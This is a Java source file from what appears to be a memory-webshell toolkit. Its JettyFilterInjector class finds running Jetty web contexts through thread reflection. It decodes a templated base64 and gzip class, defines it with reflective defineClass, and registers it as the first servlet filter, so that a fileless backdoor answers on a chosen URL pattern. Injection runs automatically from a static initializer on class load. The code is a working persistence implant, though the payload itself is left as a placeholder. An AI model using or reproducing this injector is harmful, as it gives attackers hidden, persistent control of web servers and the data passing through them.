package com.reajason.javaweb.memshell.jetty.injector;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.*;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.GZIPInputStream;

/**
 * tested v8、v9
 *
 * @author ReaJason
 */

public class JettyFilterInjector {

    static {
        new JettyFilterInjector();
    }

    public JettyFilterInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object filter = getShell(context);
                inject(context, filter);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public void inject(Object context, Object filter) throws Exception {
        Object servletHandler = getFieldValue(context, "_servletHandler");

        if (servletHandler == null) {
            return;
        }

        // 1. 判断是否已经注入
        if (isInjected(servletHandler)) {
            System.out.println("filter is already injected");
            return;
        }

        Class<?> filterHolderClass = null;
        try {
            filterHolderClass = context.getClass().getClassLoader().loadClass("org.eclipse.jetty.servlet.FilterHolder");
        } catch (ClassNotFoundException e) {
            filterHolderClass = context.getClass().getClassLoader().loadClass("org.mortbay.jetty.servlet.FilterHolder");
        }
        Constructor<?> constructor = filterHolderClass.getConstructor(Class.class);
        Object filterHolder = constructor.newInstance(filter.getClass());
        invokeMethod(filterHolder, "setName", new Class[]{String.class}, new Object[]{getClassName()});

        // 2. 注入内存马Filter
        invokeMethod(servletHandler, "addFilterWithMapping", new Class[]{filterHolderClass, String.class, int.class}, new Object[]{filterHolder, getUrlPattern(), 1});

        // 3. 修改Filter的优先级为第一位
        moveFilterToFirst(servletHandler);

        // 4. 解决 jetty filterChainsCache 导致 filter 内存马连接失败的问题
        invokeMethod(servletHandler, "invalidateChainsCache");
        System.out.println("filter added successfully");
    }

    void moveFilterToFirst(Object servletHandler) throws Exception {
        Object filterMaps = getFieldValue(servletHandler, "_filterMappings");
        ArrayList<Object> reorderedFilters = new ArrayList<Object>();
        int filterLength;

        if (filterMaps.getClass().isArray()) {
            filterLength = Array.getLength(filterMaps);
            for (int i = 0; i < filterLength; i++) {
                Object filter = Array.get(filterMaps, i);
                String filterName = (String) getFieldValue(filter, "_filterName");
                if (filterName.equals(getClassName())) {
                    reorderedFilters.add(0, filter);
                } else {
                    reorderedFilters.add(filter);
                }
            }
            for (int i = 0; i < filterLength; i++) {
                Array.set(filterMaps, i, reorderedFilters.get(i));
            }
        } else if (filterMaps instanceof ArrayList) {
            ArrayList<Object> filterList = (ArrayList<Object>) filterMaps;
            filterLength = filterList.size();
            for (Object filter : filterList) {
                String filterName = (String) getFieldValue(filter, "_filterName");
                if (filterName.equals(getClassName())) {
                    reorderedFilters.add(0, filter);
                } else {
                    reorderedFilters.add(filter);
                }
            }
            filterList.clear();
            filterList.addAll(reorderedFilters);
        } else {
            throw new IllegalArgumentException("filterMaps must be either an array or an ArrayList");
        }
    }

    List<Object> getContext() {
        List<Object> contexts = new ArrayList<Object>();
        Thread[] threads = Thread.getAllStackTraces().keySet().toArray(new Thread[0]);
        for (Thread thread : threads) {
            try {
                Object contextClassLoader = getContextClassLoader(thread);
                if (isWebAppClassLoader(contextClassLoader)) {
                    contexts.add(getContextFromWebAppClassLoader(contextClassLoader));
                } else if (isHttpConnection(thread)) {
                    contexts.add(getContextFromHttpConnection(thread));
                }
            } catch (Exception ignored) {
            }
        }
        return contexts;
    }

    private Object getContextClassLoader(Thread thread) throws Exception {
        return invokeMethod(thread, "getContextClassLoader");
    }

    private boolean isWebAppClassLoader(Object classLoader) {
        return classLoader.getClass().getName().contains("WebAppClassLoader");
    }

    private Object getContextFromWebAppClassLoader(Object classLoader) throws Exception {
        Object context = getFieldValue(classLoader, "_context");
        Object handler = getFieldValue(context, "_servletHandler");
        return getFieldValue(handler, "_contextHandler");
    }

    private boolean isHttpConnection(Thread thread) throws Exception {
        Object threadLocals = getFieldValue(thread, "threadLocals");
        Object table = getFieldValue(threadLocals, "table");
        for (int i = 0; i < Array.getLength(table); ++i) {
            Object entry = Array.get(table, i);
            if (entry != null) {
                Object httpConnection = getFieldValue(entry, "value");
                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
                    return true;
                }
            }
        }
        return false;
    }

    private Object getContextFromHttpConnection(Thread thread) throws Exception {
        Object threadLocals = getFieldValue(thread, "threadLocals");
        Object table = getFieldValue(threadLocals, "table");
        for (int i = 0; i < Array.getLength(table); ++i) {
            Object entry = Array.get(table, i);
            if (entry != null) {
                Object httpConnection = getFieldValue(entry, "value");
                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
                    Object httpChannel = invokeMethod(httpConnection, "getHttpChannel");
                    Object request = invokeMethod(httpChannel, "getRequest");
                    Object session = invokeMethod(request, "getSession");
                    Object servletContext = invokeMethod(session, "getServletContext");
                    return getFieldValue(servletContext, "this$0");
                }
            }
        }
        throw new Exception("HttpConnection not found");
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            return classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
            return clazz.newInstance();
        }
    }

    public boolean isInjected(Object servletHandler) throws Exception {
        Object filterMappings = getFieldValue(servletHandler, "_filterMappings");
        if (filterMappings == null) {
            return false;
        }
        Object[] filterMaps = new Object[0];
        if (filterMappings instanceof List) {
            filterMaps = ((List<?>) filterMappings).toArray();
        } else if (filterMappings instanceof Object[]) {
            filterMaps = (Object[]) filterMappings;
        }
        for (Object filterMap : filterMaps) {
            Object filterName = getFieldValue(filterMap, "_filterName");
            if (filterName.equals(getClassName())) {
                return true;
            }
        }
        return false;
    }


    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(name);
    }

    public static Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }
            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (NoSuchMethodException e) {
            throw e;
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }
}
